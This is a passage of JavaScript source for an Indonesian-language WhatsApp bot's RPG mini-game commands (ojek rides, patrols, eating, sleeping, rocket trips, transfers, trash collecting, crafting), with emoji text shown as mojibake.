    let tk1 = `${arg3}\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\nâ¬›â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â¬›â¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ¬›â¬œğŸ‘¤â¬œâ¬œâ¬œâ¬œâ¬œâ¬…ï¸ğŸï¸â¬œâ¬œâ¬œâ¬›\nâ¬›ğŸŒ³ğŸ â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\n${arg2}\n\n*INFORMASI*\nLokasi awal: ${arg2}\nLokasi tujuan: ${arg3}\n\n${orgnya}: ğŸ‘¤ (penumpang)\nOjek: ğŸï¸ ${db.users[m.sender].nama}\nStatus: Ojek sedang diperjalanan`
    let tk2 = `${arg3}\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\nâ¬›â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â¬›â¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ¬›â¬œâ¬œâ¬œâ¬œğŸï¸â¡ï¸â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›ğŸŒ³ğŸ â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\n${arg2}\n\n*INFORMASI*\nLokasi awal: ${arg2}\nLokasi tujuan: ${arg3}\n\n${orgnya}: ğŸ‘¤ (penumpang)\nOjek: ğŸï¸ ${db.users[m.sender].nama}\nStatus: Mau ke lokasi tujuan (${randomNomor(17, 22)}%)`
    let tk3 = `${arg3}\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\nâ¬›â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â¬›â¬†ï¸â¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›ğŸï¸â¬œâ¬›\nâ¬›â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›ğŸŒ³ğŸ â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\n${arg2}\n\n*INFORMASI*\nLokasi awal: ${arg2}\nLokasi tujuan: ${arg3}\n\n${orgnya}: ğŸ‘¤ (penumpang)\nOjek: ğŸï¸ ${db.users[m.sender].nama}\nStatus: Mau ke lokasi tujuan (${randomNomor(50, 57)}%)`
    let tk4 = `${arg3}\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\nâ¬›â¬œğŸ‘¤ğŸï¸â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â–«ï¸â¬›â¬œâ¬œâ¬›\nâ¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬œâ¬œâ¬›\nâ¬›â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬›\nâ¬›ğŸŒ³ğŸ â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›â¬›\n${arg2}\n\n*INFORMASI*\nLokasi awal: ${arg2}\nLokasi tujuan: ${arg3}\nStatus: Sampai ke tujuan`
    let ong = randomNomor(500, 1000)
    let tk5 = `*BERHASIL NGOJEK*\n\nInformasi penumpang\nNama: ${orgnya}\nOngkos: ${toRupiah(ong)}\n\nPendapatan Ngojek\nNama: ${db.users[m.sender].nama}\nMoney: ${toRupiah(ong)}`
    db.users[m.sender].saldo += ong
    edit5(tk1, tk2, tk3, tk4, tk5)
    break
  }

  case 'polisi': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina <= 70) return reply(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)
    let uang = await randomNomor(7000, 25000)
    let stamina = await randomNomor(69, 85)
    let polic1 = 'Berpatroli...'
    let polic2 = 'Kamu menemukan maling...'
    let polic3 = 'Mengejar Maling'
    let polic4 = 'Maling Tertangkap.'
    let polic5 = `Kamu membawa maling tersebut\nke kantor polisi, dan\nkamu mendapatkan\n\nuang : ${uang}\n\nStamina terpakai: ${stamina}`
    edit5(polic1, polic2, polic3, polic4, polic5)
    db.users[m.sender].saldo += uang
    global.db.erpg[m.sender].stamina -= stamina
    break
  }

  case 'makan': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastmakan)
    if (new Date() - global.db.erpg[m.sender].lastmakan < 14400000) return reply(`Kamu Baru Saja Makan, ${waktuu} Yang Lalu, Kamu dapat Makan Lagi Setelah 4 Jam Berikutnya.`)
    let drhstam = await randomNomor(65, 95)
    reply(`Kamu makan sampai kenyang\nDarah dan stamina kamu bertambah\nsebanyak ${drhstam}%`)
    global.db.erpg[m.sender].darahuser += drhstam
    global.db.erpg[m.sender].stamina += drhstam
    global.db.erpg[m.sender].lastmakan = new Date * 1
    break
  }

  case 'turu':
  case 'sleep':
  case 'tidur': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lasttidur)
    if (new Date() - global.db.erpg[m.sender].lasttidur < 14400000) return reply(`Kamu Baru Saja Tidur, ${waktuu} Yang Lalu, Kamu dapat Tidur Lagi Nanti.`)
    let drhstam = await randomNomor(70, 100)
    let tidur = await randomNomor(3, 14)
    reply(`Kamu tidur selama ${tidur} jam\nDarah dan stamina kamu bertambah\nsebanyak ${drhstam}%`)
    global.db.erpg[m.sender].darahuser += drhstam
    global.db.erpg[m.sender].stamina += drhstam
    global.db.erpg[m.sender].lasttidur = new Date * 1
    break
  }

  case 'ngeroket':
  case 'roket': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastrocket)
    if (new Date() - global.db.erpg[m.sender].lastrocket < 259200000) return reply(`Kamu Baru Saja Ke bulan, ${waktuu} Yang Lalu, Kamu dapat pergi Lagi Nanti.`)
    if (global.db.erpg[m.sender].darahuser < 1) return reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
    if (global.db.erpg[m.sender].darahuser <= 70) return reply(`Health Kamu ${global.db.erpg[m.sender].darahuser}%, Minimal health 70% !!`)
    if (global.db.erpg[m.sender].stamina <= 70) return reply(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)
    let saldo = await randomNomor(15000, 70000)
    let usrexp = await randomNomor(100, 500)
    let rokit = `ğŸŒ•\n\n\nâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’\nâ–’â–’â–„â–„â–„â–’â–’â–’â–ˆâ–’â–’â–’â–’â–„â–’â–’â–’â–’â–’â–’â–’â–’\nâ–’â–ˆâ–€â–ˆâ–€â–ˆâ–’â–ˆâ–€â–ˆâ–’â–’â–ˆâ–€â–ˆâ–’â–„â–ˆâ–ˆâ–ˆâ–„â–’\nâ–‘â–ˆâ–€â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–„â–ˆâ–„â–ˆâ–‘\nâ–‘â–ˆâ–€â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€â–ˆâ–‘â–ˆâ–„â–ˆâ–„â–ˆâ–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\nğŸš€\n\nğŸ‘¨â€ğŸš€ Memulai penerbangan....`
    let rokit2 = `ğŸŒ•\n\n\nğŸš€\nâ–’â–’â–„â–„â–„â–’â–’â–’â–ˆâ–’â–’â–’â–’â–„â–’â–’â–’â–’â–’â–’â–’â–’\nâ–’â–ˆâ–€â–ˆâ–€â–ˆâ–’â–ˆâ–€â–ˆâ–’â–’â–ˆâ–€â–ˆâ–’â–„â–ˆâ–ˆâ–ˆâ–„â–’\nâ–‘â–ˆâ–€â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–„â–ˆâ–„â–ˆâ–‘\nâ–‘â–ˆâ–€â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€â–ˆâ–‘â–ˆâ–„â–ˆâ–„â–ˆâ–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n\nâ• Dalam penerbangan....`
    let rokit3 = `ğŸŒ•ğŸš€\n\n\nâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’\nâ–’â–’â–„â–„â–„â–’â–’â–’â–ˆâ–’â–’â–’â–’â–„â–’â–’â–’â–’â–’â–’â–’â–’\nâ–’â–ˆâ–€â–ˆâ–€â–ˆâ–’â–ˆâ–€â–ˆâ–’â–’â–ˆâ–€â–ˆâ–’â–„â–ˆâ–ˆâ–ˆâ–„â–’\nâ–‘â–ˆâ–€â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–„â–ˆâ–„â–ˆâ–‘\nâ–‘â–ˆâ–€â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€â–ˆâ–‘â–ˆâ–„â–ˆâ–„â–ˆâ–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n\nâ• Sampai di tujuan....`
    let rokit4 = `ğŸŒ•ğŸš€\n\nâ• Sukses Mendarat.... ğŸ‘¨â€ğŸš€`
    let hsl = `\n*â€”[ Hasil Ngroket ${db.users[m.sender].nama} ]â€”*\nâ• ğŸ’¹ Uang = [ ${saldo} ]\nâ• âœ¨ Exp = [ ${usrexp} ]\nâ• ğŸ Mendarat Selesai = +1`
    db.users[m.sender].saldo += saldo
    db.users[m.sender].exp += usrexp
    global.db.erpg[m.sender].darahuser -= 70
    global.db.erpg[m.sender].stamina -= 70
    global.db.erpg[m.sender].lastrocket = new Date * 1
    edit5(rokit, rokit2, rokit3, rokit4, hsl)
    break
  }

  case 'tfitem':
  case 'tf':
  case 'transfer': {
    if (isPremium) return reply(`User Premium Tidak Dapat Mentransfer.`)
    try {
      if (!text) return reply(`Format: ${cmd}transfer [saldo/limit/glimit] [@tag/nomor] [jumlah]\nContoh: ${cmd}transfer limit @628123456789 1000`)
      const args = text.split(' ')
      if (args.length < 3) return reply(`Format salah!\nGunakan: ${cmd}transfer [jenis] [target] [jumlah]`)
      const tfType = args[0].toLowerCase()
      const target = args[1]
      const nominal = args[2]
      if (!target) return reply(`Tag/Masukkan Nomor Target\nContoh: ${cmd}${args[0]} @tag/628123456789 1000`)
      if (isNaN(nominal)) return reply('Nominal harus berupa angka!')
      const amount = parseInt(nominal)
      if (amount <= 0) return reply('Jumlah transfer harus lebih dari 0!')
      const maxTransfer = 1000000
      if (amount > maxTransfer) return reply(`Maksimal transfer adalah Rp. ${toRupiah(maxTransfer)}`)
      const receiver = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      if (!db.users[receiver]) return reply('Penerima tidak terdaftar!')
      if (!db.users[m.sender]) db.users[m.sender] = {}
      if (!db.users[receiver]) db.users[receiver] = {}
      switch (tfType) {
        case 'saldo':
          if (typeof db.users[m.sender].saldo === 'undefined') db.users[m.sender].saldo = 0
          if (typeof db.users[receiver].saldo === 'undefined') db.users[receiver].saldo = 0
          const senderBalance = db.users[m.sender].saldo
          if (senderBalance < amount) return reply(`Saldo tidak cukup! Saldo Anda: Rp. ${toRupiah(senderBalance)}`)
          db.users[m.sender].saldo -= amount
          db.users[receiver].saldo += amount
          return sock.sendTextWithMentions(m.chat, `âœ… *TRANSFER SALDO BERHASIL*\n\nâ€¢ Pengirim: @${m.sender.split('@')[0]}\nâ€¢ Penerima: @${receiver.split('@')[0]}\nâ€¢ Jumlah: Rp. ${toRupiah(amount)}\nâ€¢ Saldo Anda: Rp. ${toRupiah(db.users[m.sender].saldo)}`, m)
        case 'limit':
          if (typeof db.users[m.sender].limit === 'undefined') db.users[m.sender].limit = 0
          if (typeof db.users[receiver].limit === 'undefined') db.users[receiver].limit = 0
          const senderLimit = db.users[m.sender].limit
          if (senderLimit < amount) return reply(`Limit tidak cukup! Limit Anda: ${senderLimit}`)
          db.users[m.sender].limit -= amount
          db.users[receiver].limit += amount
          return sock.sendTextWithMentions(m.chat, `âœ… *TRANSFER LIMIT BERHASIL*\n\nâ€¢ Pengirim: @${m.sender.split('@')[0]}\nâ€¢ Penerima: @${receiver.split('@')[0]}\nâ€¢ Jumlah: ${amount} limit\nâ€¢ Limit Anda: ${db.users[m.sender].limit}`, m)
        case 'limitgame':
        case 'gamelimit':
        case 'glimit':
          if (typeof db.users[m.sender].glimit === 'undefined') db.users[m.sender].glimit = 0
          if (typeof db.users[receiver].glimit === 'undefined') db.users[receiver].glimit = 0
          const senderGLimit = db.users[m.sender].glimit
          if (senderGLimit < amount) return reply(`Game limit tidak cukup! Limit Anda: ${senderGLimit}`)
          db.users[m.sender].glimit -= amount
          db.users[receiver].glimit += amount
          return sock.sendTextWithMentions(m.chat, `âœ… *TRANSFER GAME LIMIT BERHASIL*\n\nâ€¢ Pengirim: @${m.sender.split('@')[0]}\nâ€¢ Penerima: @${receiver.split('@')[0]}\nâ€¢ Jumlah: ${amount} game limit\nâ€¢ Game Limit Anda: ${db.users[m.sender].glimit}`, m)
        default:
          return reply(`*Jenis Transfer Tidak Valid*\n\nTersedia:\nâ€¢ saldo\nâ€¢ limit\nâ€¢ glimit\n\nContoh: ${cmd} limit @tag 1000`)
      }
    } catch (err) {
      console.error('Transfer Error:', err)
      return reply('Terjadi kesalahan saat memproses transfer!')
    }
    break
  }

  case 'nyampah': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let botol = await randomNomor(15, 46)
    let bulu = await randomNomor(5, 36)
    let kain = await randomNomor(3, 14)
    let kardus = await randomNomor(5, 30)
    let kaleng = await randomNomor(9, 37)
    let plastik = await randomNomor(20, 56)
    let gelas = await randomNomor(5, 19)
    let health = await randomNomor(15, 40)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].sampahtime)
    if (new Date() - global.db.erpg[m.sender].sampahtime < 18000000) return reply(`Kamu Baru Saja Nyampah ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Nyampah`)
    global.db.erpg[m.sender].bulu += bulu
    global.db.erpg[m.sender].kain += kain
    global.db.erpg[m.sender].botol += botol
    global.db.erpg[m.sender].kardus += kardus
    global.db.erpg[m.sender].kaleng += kaleng
    global.db.erpg[m.sender].gelas += gelas
    global.db.erpg[m.sender].plastik += plastik
    global.db.erpg[m.sender].darahuser -= health
    global.db.erpg[m.sender].sampahtime = new Date * 1
    reply(`*â€“â€“â€“â€“â€“â€“ NYAMPAH â€“â€“â€“â€“â€“â€“*\n\nItems Didapat\n  ${vircion} â€¢ Botol: ${botol}\n  ${vircion} â€¢ Kain: ${kain}\n  ${vircion} â€¢ Bulu: ${bulu}\n  ${vircion} â€¢ Kardus: ${kardus}\n  ${vircion} â€¢ Kaleng: ${kaleng}\n  ${vircion} â€¢ Gelas: ${gelas}\n  ${vircion} â€¢ Plastik: ${plastik}\n  \nStamina Berkurang -${health}`)
    break
  }

  case 'skillselect':
  case 'selectskill': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    const user = global.db.erpg[m.sender].skillselect
    const skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
    const skil = text.trim().toLowerCase()
    if (!skill.includes(skil)) return reply(`Select skill yang ingin kamu gunakan.\n\n${skill.map(skil => `â€º ${skil}`).join('\n')}.\n\nExample: ${command} necromancer\n\n*Note!! :*\nKamu hanya bisa memilih skill 1x selebihnya\ntidak akan bisa memilih/ganti lagi`)
    if (!user || !user.skill) {
      global.db.erpg[m.sender].skillselect = skil
      reply(`Anda telah memilih Skill ${skil}`)
    } else {
      reply(`Anda Sudah Punya skill ${user.skill}. Tidak bisa diganti`)
    }
    break
  }

  case 'crafting':
  case 'craft': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (text.includes('-')) return reply('Nominal Tidak valid!!')
    if (args[0] === "kain") {
      if (!args[1]) return reply(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
      if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
      let bulu = Number(parseInt(args[1]) * 2)
      if (global.db.erpg[m.sender].bulu < bulu) return reply(`*Bulu Wol Kamu (${global.db.erpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
      global.db.erpg[m.sender].kain += parseInt(args[1])
      global.db.erpg[m.sender].bulu -= bulu
      reply(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${global.db.erpg[m.sender].bulu} Bulu Lagi`)
    } else if (args[0] === "kapal") {
      if (global.db.erpg[m.sender].kapal) return reply('Kamu Sudah Memiliki Kapal!')
      let besi = Number(20)
      let kayu = Number(50)
      let kain = Number(2)
      if (global.db.erpg[m.sender].besi < besi) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kayu < kayu) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kain < kain) return reply(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
      global.db.erpg[m.sender].kapal = true
      global.db.erpg[m.sender].besi -= besi
      global.db.erpg[m.sender].kayu -= kayu
      global.db.erpg[m.sender].kain -= kain
      let kapal = `*Berhasil Membuat Kapal!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kain: ${global.db.erpg[m.sender].kain}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
      await sock.sendMessage(m.chat, { text: kapal, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Pirate Ship)", body: 'Build a pirate ship', thumbnailUrl: "https://telegra.ph/file/6868733df8aa286682274.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    } else if (args[0] === "kapak") {
      if (global.db.erpg[m.sender].kapak) return reply('Kamu Sudah Memiliki Kapak!')
      let besi = Number(2)
      let kayu = Number(1)
      if (global.db.erpg[m.sender].besi < besi) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kayu < kayu) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
      global.db.erpg[m.sender].kapak = true
      global.db.erpg[m.sender].besi -= besi
      global.db.erpg[m.sender].kayu -= kayu
      let kapak = `*Berhasil Membuat Kapak!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
      await sock.sendMessage(m.chat, { text: kapak, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Tools Crafting)", body: 'Making equipment', thumbnailUrl: "https://telegra.ph/file/454b6bac735cd5c9e860e.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    } else if (args[0] === "rumah") {
      if (!(`${global.db.erpg[m.sender].wilayahrumah}` === `${global.db.erpg[m.sender].wilayah}`)) return reply(`Kamu Saat Ini Sedang Di ${global.db.erpg[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
      if (!args[1]) return reply('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
      if (isNaN(args[1])) return reply('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
      let besi = Number(parseInt(args[1]) * 6)
      let kayu = Number(parseInt(args[1]) * 20)
      if (global.db.erpg[m.sender].besi < besi) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kayu < kayu) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
      global.db.erpg[m.sender].rumah += parseInt(args[1])
      global.db.erpg[m.sender].besi -= besi
      global.db.erpg[m.sender].kayu -= kayu
      let rumah = `*Berhasil Membuat ${args[1]} Rumah!*\n\nJumlah: ${args[1]} Rumah\nLetak: Indonesia\n\n`
      await sock.sendMessage(m.chat, { text: rumah, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (House Crafting)", body: 'Build a house to rest', thumbnailUrl: "https://telegra.ph/file/748043e987c3b38708d44.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    } else if (args[0] === "pickaxe") {
      if (global.db.erpg[m.sender].pickaxe) return reply('Kamu Sudah Memiliki Pickaxe!')
      let besi = Number(2)
      let kayu = Number(1)
      if (global.db.erpg[m.sender].besi < besi) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kayu < kayu) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
      global.db.erpg[m.sender].pickaxe = true
      global.db.erpg[m.sender].besi -= besi
      global.db.erpg[m.sender].kayu -= kayu
      let pickaxe = `*Berhasil Membuat Pickaxe!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
      await sock.sendMessage(m.chat, { text: pickaxe, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Tools Crafting)", body: 'Making equipment', thumbnailUrl: "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    } else if (args[0] === "bajuzirah") {
      if (global.db.erpg[m.sender].bzirah) return reply('Kamu Sudah Memiliki Baju Zirah!')
      let besi = Number(6)
      let kayu = Number(2)
      let kain = Number(10)
      if (global.db.erpg[m.sender].besi < besi) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kayu < kayu) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kain < kain) return reply(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
      global.db.erpg[m.sender].bzirah = true
